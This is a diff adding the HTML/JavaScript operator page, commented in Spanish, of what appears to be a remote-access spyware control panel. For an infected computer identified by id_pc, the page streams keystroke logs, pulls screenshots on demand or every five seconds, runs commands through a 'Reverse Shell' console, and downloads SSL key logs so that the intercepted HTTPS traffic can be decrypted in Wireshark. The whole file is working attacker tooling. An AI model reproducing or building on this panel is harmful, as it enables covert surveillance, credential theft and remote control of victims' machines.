@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Computer</title>
+    <link rel="stylesheet" href="../../computer.css">
+</head>
+
+<body>
+    <nav class="min-w-screen bg-gray-900 text-white  py-4">
+        <div class="container flex my-2">
+            <a href="/menu" class="text-lg mx-5 font-semibold cursor-pointer">Home</a>
+        </div>
+    </nav>
+
+    <div class="min-h-screen min-w-screen bg-gray-800 flex flex-col items-center">
+
+        <h1 class="w-[90vw] py-5 px-6 text-white text-4xl font-bold">Registros de teclado:</h1>
+        <!-- <p class="w-[90vw] py-2 text-xl text-white"><strong>Tip:</strong> El usario puede escribir el @ con
+            "[CTRL][ALT]Q" o "[ALT]fd"</p> -->
+        <p id="keylogs"
+            class="w-[90vw] h-100 m-20 mt-0 mb-5 p-3 px-6 bg-black text-green-500 text-shadow-[1px_1px_4px_green] overflow-y-scroll font-sans drop-shadow-[6px_6px_11px_black]">
+        </p>
+        <div class="flex w-[90vw] gap-5">
+            <button id="button_getphoto"
+                class="p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1
+                border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105
+                hover:shadow-lg hover:shadow-white/10 active:scale-95">Capturar
+                pantalla</button>
+            <button id="button_stream"
+                class="p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1 border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105 hover:shadow-lg hover:shadow-white/10 active:scale-95">Capturar
+                pantalla (cada 5 segundos)</button>
+        </div>
+
+        <h1 class="flex w-[90vw] mb-3 text-white text-2xl font-bold">Pantalla: </h1>
+        <img id="image" class="w-[90vw] mb-10" src="" alt="">
+
+        <h1 class="flex w-[90vw] mb-3 text-white text-2xl font-bold">Reverse Shell:</h1>
+        <div
+            class="w-[90vw] h-100 m-20 mt-0 mb-5 p-3 px-6 bg-black text-green-500 text-shadow-[1px_1px_4px_green] overflow-y-scroll font-mono drop-shadow-[6px_6px_11px_black]">
+            <p id="command"></p>
+            <strong
+                class="text-white text-shadow-white font-bold font-['Source Sans Pro',sans-serif]">[Entrada]:</strong>
+            <input id="command_text" class="w-[70vw] outline-none hover:cursor-pointer" type="text">
+        </div>
+        <div class="flex w-[90vw] gap-5">
+            <button id="button_command"
+                class="p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1
+                border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105
+                hover:shadow-lg hover:shadow-white/10 active:scale-95">Enviar
+                comando</button>
+            <button id="button_clear_command" class="p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1
+                border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105
+                hover:shadow-lg hover:shadow-white/10 active:scale-95">Limpiar
+                consola</button>
+        </div>
+
+        <h1 class="flex w-[90vw] mb-3 text-white text-2xl font-bold">Archivos de trafico de datos:</h1>
+        <div class="flex gap-5 w-[90vw]">
+            <button
+                class="p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1 border-[white]/5 transition-all duration-300 ease-in-out
+               hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105 hover:shadow-lg hover:shadow-white/10 active:scale-95"
+                onclick="descargarSllKeyLogFile()">
+                Descargar SSL Key Log File</button>
+            <!-- <button
+                class="p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1 border-[white]/5 transition-all duration-300 ease-in-out
+               hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105 hover:shadow-lg hover:shadow-white/10 active:scale-95"
+                onclick="descargarCapturedTraffic()">
+                Descargar Trafico Capturado</button> Lo comentamos ya que no se va a descargar este archivo, se tendra que obtener de otra forma -->
+        </div>
+        <p class="w-[90vw] ml-10 text-red-500" id="info-file"></p>
+        <p class="w-[90vw] my-3 mb-10 text-white">Para leer los datos que el computador ha estado enviando, se necesita
+            usar la herramienta Wireshark. El procedimiento para leer
+            la captura de trafico (https), mediante el registro de llaves ssl se puede ver en youtube. La captura de
+            trafico pcap que se intercepto durante los primeros
+            30 minutos de encendido del computador se puede descargar con el boton "Descargar SSL Key Log File". Las
+            llaves ssl usadas se pueden descargar con el boton "Descargar Trafico Capturado".</p>
+
+    </div>
+
+    <script>
+        var comandosInput = [];
+        var textoComandos = '';
+        var textoRegistroTeclas = '';
+
+        (async () => {
+
+            let data = await fetch(window.location.href + 'log/').then(res => res.text()).then(text => text);
+            let log_data = JSON.parse(data);
+
+            // Añadir listener a entrada de comandos
+            document.getElementById('command_text').addEventListener('keydown', async (event) => {
+                switch (event.code) {
+                    case 'Enter':
+                        document.getElementById('button_command').click();
+                        break;
+                    case 'ArrowUp':
+                        cambiarComandoSuperior();
+                        break;
+                    case 'ArrowDown':
+                        cambiarComandoInferior();
+                        break;
+                }
+            })
+
+            // Añadir listener a boton de ejecucion de comandos
+            document.getElementById('button_command').addEventListener('click', async () => enviarComandoInput());
+
+            // Añadir listener a boton de limpiar consola
+            document.getElementById('button_clear_command').addEventListener('click', async () => {
+
+                await fetch(window.location.href + 'clear-command', {
+                    method: 'POST', body: JSON.stringify({
+                        id_pc: log_data.id_pc
+                    }), headers: {
+                        'Content-Type': 'application/json',
+                        'Access-Control-Allow-Origin': '*'
+                    }
+                })
+            })
+
+            // Añadir listener a boton para tomar foto
+            document.getElementById('button_getphoto').addEventListener('click', async () => {
+                document.getElementById('button_getphoto').disabled = true
+                document.getElementById('button_getphoto').className = `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white/15 rounded-3xl border-solid border-1
+                        border-[white]/15 transition-all duration-300 ease-in-out`
+
+                await tomarFoto();
+
+                // Dejar deshabilitado el boton de tomar foto por 5 segundo cada vez
+                // que se presiona
+                setTimeout(() => {
+                    document.getElementById('button_getphoto').disabled = false
+                    document.getElementById('button_getphoto').className = `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1
+                        border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105
+                        hover:shadow-lg hover:shadow-white/10 active:scale-95`
+                }, 1000)
+            })
+
+            // Añadir listener a boton de stream
+            let interval
+            document.getElementById('button_stream').addEventListener('click', async () => {
+
+                // Deshabilitar el boton de tomar captura cada vez que el boton de stream esta
+                // activado, y desactivarlo en caso contrario
+                if (document.getElementById('button_stream').className == `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1 border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105 hover:shadow-lg hover:shadow-white/10 active:scale-95`) // Si el stream esta desactivado
+                {
+                    document.getElementById('button_getphoto').disabled = true
+                    document.getElementById('button_getphoto').className = `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white/15 rounded-3xl border-solid border-1 border-[white]/15 transition-all duration-300 ease-in-out`
+                    document.getElementById('button_stream').className = `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white/15 rounded-3xl border-solid border-1 border-[white]/15 transition-all duration-300 ease-in-out`
+
+                    interval = setInterval(async () => await tomarFoto(), 5000)
+                } else if (document.getElementById('button_stream').className == `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white/15 rounded-3xl border-solid border-1 border-[white]/15 transition-all duration-300 ease-in-out`)  // Si el stream esta activado 
+                {
+                    document.getElementById('button_getphoto').disabled = true
+                    document.getElementById('button_getphoto').className = `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1 border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105 hover:shadow-lg hover:shadow-white/10 active:scale-95`
+                    document.getElementById('button_stream').className = `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1 border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105 hover:shadow-lg hover:shadow-white/10 active:scale-95`
+                    
+                    clearInterval(interval)
+                }
+            })
+
+
+            // Intervalo de 2 segundos para actualizar la imagen
+            setInterval(async () => await actualizarImagen(), 2000);
+
+            // Intervalo para actulizar los logs cada 0,5 segundos
+            setInterval(async () => await actualizarLogs(), 500);
+
+            // Intervalo para actulizar los comandos cada 1 segundos
+            setInterval(async () => await actulizarComandos(), 1000)
+
+        })()
+
+        ////////////////
+
+        async function actualizarLogs() {
+            let data = await obtenerLogs();
+            let log = JSON.parse(data).package;
+
+
+            if (log != textoRegistroTeclas) {
+                // Dar estilo a los logs
+                document.getElementById('keylogs').innerText = log;
+                document.getElementById('keylogs').innerHTML = document.getElementById('keylogs').innerHTML
+                    .replace(/\]:/g, ']:</strong>')
+                    .replace(/\[Mon/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Mon')
+                    .replace(/\[Thu/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Thu')
+                    .replace(/\[Wed/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Wed')
+                    .replace(/\[Tue/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Tue')
+                    .replace(/\[Sat/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Sat')
+                    .replace(/\[Fri/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Fri')
+                    .replace(/\[Sun/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Sun')
+                    .replace(/\[lun/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[lun')
+                    .replace(/\[mar/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[mar')
+                    .replace(/\[mie/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[mie')
+                    .replace(/\[jue/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[jue')
+                    .replace(/\[sab/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[sab')
+                    .replace(/\[vie/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[vie')
+                    .replace(/\[dom/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[dom');
+
+                textoRegistroTeclas = log;
+            }
+
+            console.log('hasta aca');
+        }
+
+        async function actualizarImagen() {
+            let data = await obtenerLogs();
+            let screenshot = JSON.parse(data).screenshot;
+
+            document.getElementById('image').src = `data:image/png;base64,${screenshot}`;
+        }
+
+        async function actulizarComandos() {
+            let command_data = await fetch(window.location.href + 'command/').then(res => res.text()).then(text => text);
+            let command_object = JSON.parse(command_data)
+
+            // Añadir estilo a los logs, ademas para que se vean mas entendibles
+            let command_inner_text = ""
+            for (let i = 0; i < command_object.outputs.length; i++) {
+                command_inner_text += "[Entrada]: " + command_object.inputs.at(i) + "\n"
+                command_inner_text += "[Salida]: " + command_object.outputs.at(i) + "\n"
+            }
+
+
+            if (command_data != textoComandos) {
+                document.getElementById('command').innerText = command_inner_text;
+
+                document.getElementById('command').innerHTML = document.getElementById('command').innerHTML
+                    .replace(/\]:/g, ']:</strong>')
+                    .replace(/\[Entrada/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Entrada')
+                    .replace(/\[Salida/g, '<strong class="text-white text-shadow-white font-bold font-["Source Sans Pro",sans-serif]">[Salida');
+
+                textoComandos = command_data;
+            }
+
+        }
+
+        async function tomarFoto() {
+            let data = await obtenerLogs();
+            let log_data = JSON.parse(data);
+
+            await fetch(window.location.origin + '/getphoto', {
+                method: 'POST', body: JSON.stringify({
+                    id_pc: log_data.id_pc
+                }), headers: {
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*'
+                }
+            });
+        }
+
+        async function enviarComandoInput() {
+            let data = await obtenerLogs();
+            let log_data = JSON.parse(data);
+
+            document.getElementById('button_command').disabled = true
+            document.getElementById('button_command').className = `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/15 text-white/15 rounded-3xl border-solid border-1
+                border-[white]/5 transition-all duration-300 ease-in-out`
+
+            colocarComando();
+
+            await fetch(window.location.href + 'command/input', {
+                method: 'POST', body: JSON.stringify({
+                    id_pc: log_data.id_pc,
+                    command: obtenerComandoInput()
+                }), headers: {
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*'
+                }
+            })
+
+            // Dejar deshabilitado el boton de tomar foto por 1 segundo cada vez
+            // que se presiona
+            setTimeout(() => {
+                document.getElementById('button_command').disabled = false
+                document.getElementById('button_command').className = `p-4 px-10 mb-4 font-mono font-roboto-mono bg-[#7e7e7e]/20 text-white rounded-3xl border-solid border-1
+                border-[white]/5 transition-all duration-300 ease-in-out hover:bg-white/20 hover:backdrop-blur-md hover:border-white/30 hover:scale-105
+                hover:shadow-lg hover:shadow-white/10 active:scale-95`
+            }, 1000)
+        }
+
+        async function obtenerLogs() {
+            return await fetch(window.location.href + 'log/').then(res => res.text()).then(text => text);
+        }
+
+        function obtenerComandoInput() {
+            return document.getElementById('command_text').value;
+        }
+
+        function colocarComando() {
+            let comando = obtenerComandoInput();
+
+            console.log(comandosInput);
+
+            if (comandosInput.find(input => input == comando) == undefined) comandosInput.push(comando);
+        }
+
+        function cambiarComandoSuperior() {
+            let comando = obtenerComandoInput();
+
+            console.log(comandosInput);
+
+            if (comandosInput.find(input => input == comando) == undefined) comandosInput.push(comando);
+            if (comandosInput.findIndex(input => comando == input) == 0) return;
+
+            return document.getElementById('command_text').value = comandosInput[comandosInput.findIndex(input => comando == input) - 1];
+        }
+
+        function cambiarComandoInferior() {
+            let comando = obtenerComandoInput();
+
+            console.log(comandosInput);
+
+            if (comandosInput.find(input => input == comando) == undefined) comandosInput.push(comando);
+            if (comandosInput.findIndex(input => comando == input) == comandosInput.length - 1) return;
+
+            document.getElementById('command_text').value = comandosInput[comandosInput.findIndex(input => comando == input) + 1];
+        }
+
+        async function descargarSllKeyLogFile() {
+            try {
+                let id_pc = JSON.parse(await obtenerLogs()).id_pc;
+
+                const response = await fetch(`/sllkeylog?id_pc=${id_pc}`);
+
+                if (!response.ok) {
+                    return document.getElementById('info-file').innerText = 'El archivo aún no existe';
+                } else {
+                    document.getElementById('info-file').innerText = '';
+                }
+
+                const buffer = await response.arrayBuffer();
+                const blob = new Blob([buffer], { type: 'application/octet-stream' });
+
+                const url = window.URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+
+                const contentDisposition = response.headers.get('Content-Disposition');
+                let filename = 'archivo.log';
+
+                if (contentDisposition) {
+                    // Buscar filename en el header
+                    const match = contentDisposition.match(/filename="?(.+?)"?\s*(?:;|$)/);
+                    if (match) {
+                        filename = match[1];
+                        // Decodificar si está codificado (RFC 5987)
+                        if (filename.startsWith('UTF-8\'\'')) {
+                            filename = decodeURIComponent(filename.replace('UTF-8\'\'', ''));
+                        }
+                    }
+                }
+
+                link.download = filename;
+                link.click();
+
+                window.URL.revokeObjectURL(url);
+
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function descargarCapturedTraffic() {
+            try {
+                let id_pc = JSON.parse(await obtenerLogs()).id_pc;
+
+                const response = await fetch(`/captured-traffic?id_pc=${id_pc}`);
+
+                if (!response.ok) {
+                    return document.getElementById('info-file').innerText = 'El archivo aún no existe';
+                } else {
+                    document.getElementById('info-file').innerText = '';
+                }
+
+                const buffer = await response.arrayBuffer();
+                const blob = new Blob([buffer], { type: 'application/octet-stream' });
+
+                const url = window.URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+
+                const contentDisposition = response.headers.get('Content-Disposition');
+                let filename = 'archivo.log';
+
+                if (contentDisposition) {
+                    // Buscar filename en el header
+                    const match = contentDisposition.match(/filename="?(.+?)"?\s*(?:;|$)/);
+                    if (match) {
+                        filename = match[1];
+                        // Decodificar si está codificado (RFC 5987)
+                        if (filename.startsWith('UTF-8\'\'')) {
+                            filename = decodeURIComponent(filename.replace('UTF-8\'\'', ''));
+                        }
+                    }
+                }
+
+                link.download = filename;
+                link.click();
+
+                window.URL.revokeObjectURL(url);
+
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</body>
+
+</html>
